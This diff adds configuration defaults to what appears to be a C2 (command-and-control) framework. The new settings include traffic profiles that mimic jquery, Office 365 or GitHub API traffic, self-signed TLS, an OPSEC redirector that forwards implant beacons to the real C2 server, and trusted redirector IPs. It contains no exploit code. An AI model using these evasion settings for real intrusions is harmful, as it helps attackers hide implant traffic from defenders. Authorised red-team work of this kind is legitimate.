@@ -53,6 +53,41 @@ DEFAULTS = {
             "beacon_interval": 5,
             "jitter": 0.1,
         },
+        # Traffic profile — controls URL paths and response headers
+        # Options: default | jquery | office365 | github-api
+        "traffic_profile": "default",
+        # TLS / HTTPS configuration
+        "tls": {
+            "enabled": False,
+            # Hostname for the self-signed cert SAN (defaults to machine FQDN)
+            "hostname": "",
+            # Additional SANs — list of hostnames or IPs
+            "extra_sans": [],
+            # Cert validity in days
+            "cert_days": 365,
+            # Explicit cert/key paths (leave empty to auto-generate in major/tls/)
+            "cert_path": "",
+            "key_path": "",
+        },
+        # HTTP redirector — transparent forwarding proxy for OPSEC
+        "redirector": {
+            "enabled": False,
+            "listen_host": "0.0.0.0",
+            "listen_port": 80,
+            # Where to forward matched traffic (your actual C2)
+            "upstream_url": "http://127.0.0.1:8443",
+            # Only forward requests matching these path prefixes
+            # Empty list = forward everything
+            "allowed_paths": [],
+            # Reject beacons that don't contain this UA fragment
+            "user_agent_filter": "",
+            # Set false for self-signed upstream certs (typical for C2 HTTPS)
+            "verify_tls": False,
+            "upstream_timeout": 10,
+        },
+        # Trusted redirector IPs — X-Forwarded-For from these IPs is trusted
+        # to contain the real implant IP (set to your redirector IP)
+        "trusted_redirectors": [],
         "governance": {
             # Route policy decisions through the BearClaw enforcement path.
             # "local" performs local policy checks compatible with BearClaw inputs.
